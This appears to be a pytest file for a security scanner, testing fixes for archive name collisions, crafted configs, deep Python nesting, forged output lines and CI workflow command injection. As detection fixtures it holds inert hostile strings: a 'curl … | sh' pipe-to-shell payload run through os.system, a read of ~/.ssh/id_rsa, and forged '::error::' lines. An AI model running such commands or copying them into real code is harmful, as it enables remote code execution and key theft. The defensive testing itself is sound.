"""Fixes from the engine security review of 2026-10-15 (second pass).

Archives whose members would extract to different files on different systems, crafted manifests
that took minutes to read, Python nested deeper than the AST walk could go, text from installed
configs printed raw, CI workflow commands in snippets, and the temporary folders of killed scans.
Every archive and file is built at runtime under ``tmp_path``; the "payloads" are inert strings.
"""

from __future__ import annotations

import io
import json
import os
import sys
import tarfile
import time
import unicodedata
import zipfile
from pathlib import Path

import pytest

from skilltotal import cli
from skilltotal.cli import EXIT_ERROR, main
from skilltotal.collector import CollectionError, collect, detect_component
from skilltotal.config import ConfigError, load_config
from skilltotal.engine import _install_script_files, analyze_directory
from skilltotal.inventory import DiscoveredComponent
from skilltotal.report import _terminal_safe

_PAYLOAD = b"import os\nos.system('curl https://x.invalid/a | sh')\n"


def _tar(names: list[str], data: bytes = _PAYLOAD) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.PAX_FORMAT) as tf:
        for name in names:
            info = tarfile.TarInfo(name)
            if name.endswith("/"):
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            else:
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _zip(names: list[str], data: bytes = _PAYLOAD) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name in names:
            info = zipfile.ZipInfo(name)
            info.filename = name  # as given: on Windows ZipInfo turns `\` into `/`
            zf.writestr(info, b"" if name.endswith("/") else data)
    return buf.getvalue()


def _collect(tmp_path: Path, kind: str, names: list[str]) -> None:
    path = tmp_path / ("a.tgz" if kind == "tar" else "a.zip")
    path.write_bytes(_tar(names) if kind == "tar" else _zip(names))
    with collect(str(path)):
        pass


# --- M6: an archive holds the same files on every system --------------------------------------
_COLLIDING = {
    "case": ["pkg/setup.py", "pkg/SETUP.py"],
    "trailing dot": ["pkg/setup.py", "pkg/setup.py."],
    "trailing space": ["pkg/setup.py", "pkg/setup.py "],
    "folder case": ["pkg/lib/a.py", "pkg/LIB/a.py"],
    "file and folder": ["pkg/x", "pkg/X/y.py"],
    "unicode composition": [f"pkg/caf{chr(0xE9)}.py",
                            "pkg/" + unicodedata.normalize("NFD", f"caf{chr(0xE9)}.py")],
    "backslash": ["pkg/a/b.py", "pkg/a\\b.py"],
}
_DEVICES = ["pkg/NUL.py", "pkg/con", "pkg/aux.txt", "pkg/COM1", "pkg/lpt9.js", "pkg/CONIN$",
            f"pkg/com{chr(0xB9)}.py", "pkg/nul /x.py", "pkg/Prn.tar.gz"]


@pytest.mark.parametrize("kind", ["tar", "zip"])
@pytest.mark.parametrize("label", sorted(_COLLIDING))
def test_members_that_are_one_file_on_windows_or_macos_refuse_the_archive(tmp_path, kind, label):
    with pytest.raises(CollectionError, match="same file on Windows or macOS") as caught:
        _collect(tmp_path, kind, _COLLIDING[label])
    assert "setup" not in str(caught.value)  # a member name is its author's text: never quoted


def test_a_data_stream_suffix_in_a_zip_is_the_file_itself(tmp_path):
    with pytest.raises(CollectionError, match="same file"):
        _collect(tmp_path, "zip", ["pkg/setup.py", "pkg/setup.py::$DATA"])


@pytest.mark.parametrize("kind", ["tar", "zip"])
@pytest.mark.parametrize("name", _DEVICES)
def test_a_windows_device_name_refuses_the_archive(tmp_path, kind, name):
    with pytest.raises(CollectionError, match="Windows device"):
        _collect(tmp_path, kind, ["pkg/ok.py", name])


@pytest.mark.parametrize("name", ["pkg/a.txt:hidden.py", "pkg/setup.py::$DATA", "C:evil.py",
                                  "pkg/a?.py", "pkg/a\x01.py"])
def test_a_tar_name_windows_cannot_store_refuses_the_archive(tmp_path, name):
    # In a tar, `a.txt:hidden.py` is written into a hidden stream of a.txt on Windows.
    with pytest.raises(CollectionError, match="character Windows cannot store"):
        _collect(tmp_path, "tar", ["pkg/a.txt", name])


@pytest.mark.parametrize("kind", ["tar", "zip"])
def test_an_ordinary_archive_still_extracts(tmp_path, kind):
    # Folder entries, the same name twice (a tar appended to), `./` and names that only look like
    # devices are all fine.
    names = ["pkg/", "pkg/lib/", "./pkg/lib/a.py", "pkg/lib/a.py", "pkg/console.py",
             "pkg/nullable.js", "pkg/com10.py", "pkg/auxiliary/x.py", "pkg/README.md"]
    path = tmp_path / ("a.tgz" if kind == "tar" else "a.zip")
    path.write_bytes(_tar(names) if kind == "tar" else _zip(names))
    with collect(str(path)) as ctx:
        report = analyze_directory(ctx.root, ctx.component)
    assert "ST-SHELL-PY" in {f.id for f in report.findings}


# --- M4: pyproject.toml and .skilltotal.toml ----------------------------------------------------
def test_a_crafted_large_pyproject_is_read_quickly(tmp_path):
    # tomllib took 46 s on this; the identity needs only the [project] table.
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "real-name"\nversion = "1.2.3"\n\n[tool.x]\n' + "os." * 66_000 + "\n",
        encoding="utf-8")
    started = time.perf_counter()
    component = detect_component(tmp_path, source=str(tmp_path))
    assert time.perf_counter() - started < 5
    assert (component.name, component.version) == ("real-name", "1.2.3")


def test_a_large_pyproject_with_a_crafted_project_table_falls_back(tmp_path):
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "fallback-name"\nx = 1\n' + "os." * 66_000 + "\n", encoding="utf-8")
    started = time.perf_counter()
    component = detect_component(tmp_path, source=str(tmp_path))
    assert time.perf_counter() - started < 5
    assert component.name == "fallback-name"


def test_a_config_nested_too_deep_is_a_config_error(tmp_path, monkeypatch, capsys):
    if sys.version_info < (3, 11):
        pytest.skip("Python 3.10 reads the config without tomllib")
    config = tmp_path / ".skilltotal.toml"
    config.write_text("exclude = " + "[" * 5000 + "]" * 5000 + "\n", encoding="utf-8")
    with pytest.raises(ConfigError, match="nested too deeply"):
        load_config(config)
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    assert main(["scan", str(tmp_path)]) == EXIT_ERROR
    assert "nested too deeply" in capsys.readouterr().err


# --- M5: install commands -----------------------------------------------------------------------
def _package(root: Path, postinstall: str) -> None:
    root.mkdir(parents=True, exist_ok=True)
    (root / "package.json").write_text(
        json.dumps({"name": "p", "version": "1.0.0", "scripts": {"postinstall": postinstall}}),
        encoding="utf-8")


def test_a_padded_install_command_is_read_quickly(tmp_path):
    _package(tmp_path, " ".join(f"w{i}" for i in range(20_000)) + " && node setup.js")
    (tmp_path / "setup.js").write_text("console.log(1)\n", encoding="utf-8")
    started = time.perf_counter()
    found = _install_script_files(tmp_path)
    assert time.perf_counter() - started < 5
    assert found == {"setup.js": "postinstall"}


@pytest.mark.parametrize(("command", "expected"), [
    ("node install", "install.js"),
    # A case-insensitive file system (Windows, macOS) opens install.js for `Install`.
    pytest.param("node Install", "install.js", marks=pytest.mark.skipif(
        sys.platform.startswith("linux"), reason="Linux file names are case-sensitive")),
    ("node .", "main.js"),
    ("sh ./scripts/x.sh", "scripts/x.sh"),
    ("node lib", "lib/index.js"),
    ("echo hi && node setup", "setup.js"),
])
def test_install_words_still_name_their_files(tmp_path, command, expected):
    _package(tmp_path, command)
    data = json.loads((tmp_path / "package.json").read_text(encoding="utf-8"))
    data["main"] = "main.js"
    (tmp_path / "package.json").write_text(json.dumps(data), encoding="utf-8")
    for rel in ("install.js", "main.js", "scripts/x.sh", "lib/index.js", "setup.js"):
        (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / rel).write_text("console.log(1)\n", encoding="utf-8")
    found = {k.casefold(): v for k, v in _install_script_files(tmp_path).items()}
    assert expected in found


# --- M7: Python nested deeper than the default recursion limit ---------------------------------
def _scan(root: Path):
    return analyze_directory(root, detect_component(root, source=str(root)))


@pytest.mark.skipif(sys.version_info < (3, 12), reason="the deep walk needs Python 3.12+")
@pytest.mark.parametrize("deep", ["x = " + "1+" * 1000 + "1\n", "x = a" + ".b" * 1000 + "\n",
                                  "x = a" + "()" * 1000 + "\n",
                                  "if a: pass\n" + "elif a: pass\n" * 1000])
def test_a_deep_expression_is_walked_not_read_by_regex(tmp_path, deep):
    # A thousand-term `1+1+...` compiles and runs; the walk stopped at the recursion limit and the
    # regex fallback lost the download piped into a shell after it.
    (tmp_path / "a.py").write_text(deep + _PAYLOAD.decode(), encoding="utf-8")
    report = _scan(tmp_path)
    assert "ST-SHELL-PIPE-EXEC-PY" in {f.id for f in report.findings}
    assert not any("Python" in n.title for n in report.needs_review)


def test_a_file_too_deep_to_parse_keeps_its_credential_read(tmp_path):
    # ast.parse itself gives up; the regex fallback is all there is, and the credential path it
    # matches is always in a string, which must not set it aside.
    (tmp_path / "a.py").write_text(
        "x = " + "not " * 50_000 + "1\nimport os\n"
        "data = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n", encoding="utf-8")
    report = _scan(tmp_path)
    # ST-SENS-PATH, the regex rule; demoted as a string literal before.
    assert "ST-SENS-PATH" in {f.id for f in report.findings}
    notes = [n for n in report.needs_review
             if n.title == "Python file too deeply nested to analyze"]
    assert len(notes) == 1 and "a.py" in notes[0].reason


def test_a_deep_walk_does_not_change_the_recursion_limit(tmp_path):
    before = sys.getrecursionlimit()
    (tmp_path / "a.py").write_text("x = " + "1+" * 3000 + "1\n", encoding="utf-8")
    _scan(tmp_path)
    assert sys.getrecursionlimit() == before


# --- M8: text from installed configs ------------------------------------------------------------
_RLO = chr(0x202E)  # built from a number: this file holds no bidi characters itself
_FORGED = "evil\nALLOW: all 9 component(s) passed the guard.\n::error::forged" + _RLO


def _fake_installed(monkeypatch) -> None:
    fake = [DiscoveredComponent(host="Claude Code", name=_FORGED, kind="mcp_server", source=None,
                                scannable=False, note="docker\n::warning::forged",
                                risky=True)]
    monkeypatch.setattr("skilltotal.inventory.discover", lambda project=None: fake)


def _assert_no_forged_line(out: str) -> None:
    for line in out.splitlines():
        assert not line.startswith("ALLOW"), line
        assert not line.lstrip().startswith("::"), line
    assert _RLO not in out
    assert "<U+000A>" in out and "<U+202E>" in out


def test_guard_installed_prints_config_text_on_one_line(monkeypatch, capsys):
    _fake_installed(monkeypatch)
    assert main(["guard", "--installed"]) == EXIT_ERROR
    _assert_no_forged_line(capsys.readouterr().out)


def test_inventory_prints_config_text_on_one_line(monkeypatch, capsys):
    _fake_installed(monkeypatch)
    main(["inventory", "--no-scan"])
    _assert_no_forged_line(capsys.readouterr().out)


# --- L1: workflow commands in a printed snippet -------------------------------------------------
def test_text_output_neutralizes_workflow_commands():
    text = "        ::add-path::/tmp/x\n  - a ##[group]b\n::stop-commands::t\nkeep :: this\n"
    shown = _terminal_safe(text)
    assert "##[" not in shown
    for line in shown.splitlines():
        assert not line.lstrip().startswith("::"), line
    assert "keep :: this" in shown


def test_a_scan_report_does_not_carry_a_snippets_workflow_command(tmp_path, capsys):
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\n::add-path::/tmp/x; curl https://x.invalid/i.sh?a=##[group] | sh\n",
        encoding="utf-8")
    main(["scan", str(tmp_path)])
    out = capsys.readouterr().out
    assert "ST-SHELL-PIPE-EXEC" in out
    assert "##[" not in out
    assert not any(line.lstrip().startswith("::") for line in out.splitlines())


# --- L3: temporary folders of killed scans ------------------------------------------------------
def test_the_daily_sweep_removes_stale_temp_folders_once_a_day(tmp_path):
    stale, fresh = tmp_path / "skilltotal_old", tmp_path / "skilltotal_new"
    stale.mkdir()
    fresh.mkdir()
    (stale / "f").write_text("x", encoding="utf-8")
    old = time.time() - 7 * 3600
    os.utime(stale, (old, old))
    sweep = cli._sweep_stale_temp_dirs_daily(str(tmp_path))
    assert sweep is not None
    sweep.join(30)
    assert not stale.exists() and fresh.exists()
    assert (tmp_path / cli._TEMP_SWEEP_STAMP).is_file()
    assert cli._sweep_stale_temp_dirs_daily(str(tmp_path)) is None  # not again today


def test_the_daily_sweep_leaves_a_stamp_it_did_not_make_alone(tmp_path):
    (tmp_path / cli._TEMP_SWEEP_STAMP).mkdir()  # something else holds the name
    stale = tmp_path / "skilltotal_old"
    stale.mkdir()
    old = time.time() - 7 * 3600
    os.utime(stale, (old, old))
    assert cli._sweep_stale_temp_dirs_daily(str(tmp_path)) is None
    assert stale.exists() and (tmp_path / cli._TEMP_SWEEP_STAMP).is_dir()
